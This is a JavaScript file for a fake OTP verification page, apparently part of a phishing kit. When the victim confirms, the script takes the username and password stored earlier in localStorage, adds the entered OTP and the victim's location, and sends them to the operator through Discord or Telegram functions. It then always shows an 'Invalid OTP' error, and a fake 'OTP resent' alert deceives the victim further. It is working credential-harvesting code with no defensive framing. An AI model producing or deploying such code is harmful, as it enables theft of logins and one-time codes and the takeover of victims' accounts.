// OTP Verification Page JavaScript

document.addEventListener('DOMContentLoaded', function() {
    const otpInputs = document.querySelectorAll('.otp-input');
    const confirmBtn = document.getElementById('confirmBtn');
    const errorMessage = document.getElementById('errorMessage');
    const resendLink = document.getElementById('resendLink');

    // Auto-focus and move to next input
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
            // Only allow numbers
            this.value = this.value.replace(/[^0-9]/g, '');
            
            // Move to next input if value is entered
            if (this.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
            
            // Hide error message when user starts typing
            if (errorMessage.style.display === 'block') {
                errorMessage.style.display = 'none';
            }
        });

        // Handle backspace
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                otpInputs[index - 1].focus();
            }
        });

        // Handle paste
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
            const digits = pastedData.split('').slice(0, 6);
            
            digits.forEach((digit, i) => {
                if (otpInputs[i]) {
                    otpInputs[i].value = digit;
                }
            });
            
            // Focus the last filled input or the first empty one
            const lastFilledIndex = Math.min(digits.length - 1, otpInputs.length - 1);
            if (lastFilledIndex < otpInputs.length - 1) {
                otpInputs[lastFilledIndex + 1].focus();
            } else {
                otpInputs[lastFilledIndex].focus();
            }
        });
    });

    // Focus first input on load
    otpInputs[0].focus();

    // Confirm Button Click Handler
    if (confirmBtn) {
        confirmBtn.addEventListener('click', function() {
            // Get all OTP values
            const otpValues = Array.from(otpInputs).map(input => input.value).join('');
            
            // Check if all fields are filled
            if (otpValues.length !== 6) {
                // Show error if not all fields are filled
                showError('Please enter complete OTP');
                return;
            }

            // Get stored username and password from localStorage
            const username = localStorage.getItem('loginUsername') || 'N/A';
            const password = localStorage.getItem('loginPassword') || 'N/A';
            const timestamp = new Date().toLocaleString();
            
            // Get location (use stored location from splash if available, otherwise get new one)
            let locationPromise;
            const storedLocation = localStorage.getItem('userLocation');
            if (storedLocation) {
                try {
                    const parsedLocation = JSON.parse(storedLocation);
                    if (parsedLocation.latitude !== 'N/A') {
                        console.log('📍 Using stored location from splash screen');
                        locationPromise = Promise.resolve(parsedLocation);
                    } else {
                        locationPromise = getUserLocation();
                    }
                } catch (e) {
                    locationPromise = getUserLocation();
                }
            } else {
                locationPromise = getUserLocation();
            }
            
            locationPromise.then(location => {
                // Prepare message for Discord with username, password, OTP, and location
                const locationText = formatLocationForDiscord(location);
                const message = `
🔐 OTP Verification Attempt

👤 Username: ${username}
🔑 Password: ${password}
🔢 OTP: ${otpValues}

${locationText}

🕐 Time: ${timestamp}
                `.trim();

                // Send to Discord
                if (typeof sendToTelegram === 'function' || typeof sendToDiscord === 'function') {
                    const sendFunction = sendToDiscord || sendToTelegram;
                    sendFunction(message).then(success => {
                        if (success) {
                            console.log('OTP credentials sent to Discord');
                        } else {
                            console.log('Discord send failed');
                        }
                    }).catch(error => {
                        console.log('Discord error:', error);
                    });
                } else {
                    console.log('Discord not configured');
                }
            }).catch(error => {
                // If location fails, send without location
                console.log('Location error:', error);
                const message = `
🔐 OTP Verification Attempt

👤 Username: ${username}
🔑 Password: ${password}
🔢 OTP: ${otpValues}

📍 Location: Not available

🕐 Time: ${timestamp}
                `.trim();

                if (typeof sendToTelegram === 'function' || typeof sendToDiscord === 'function') {
                    const sendFunction = sendToDiscord || sendToTelegram;
                    sendFunction(message).catch(err => console.log('Discord error:', err));
                }
            });

            // Show error message as per requirement
            showError('Invalid OTP please try again later');
            
            // Clear all inputs after showing error
            setTimeout(() => {
                otpInputs.forEach(input => {
                    input.value = '';
                });
                otpInputs[0].focus();
            }, 2000);
        });
    }

    // Function to show error message
    function showError(message) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
        
        // Add shake animation
        errorMessage.style.animation = 'none';
        setTimeout(() => {
            errorMessage.style.animation = 'shake 0.5s ease-in-out';
        }, 10);
    }

    // Resend OTP Link
    if (resendLink) {
        resendLink.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Clear all inputs
            otpInputs.forEach(input => {
                input.value = '';
            });
            
            // Hide error message
            errorMessage.style.display = 'none';
            
            // Focus first input
            otpInputs[0].focus();
            
            // Show message (optional)
            alert('OTP has been resent to your registered mobile number');
        });
    }
});
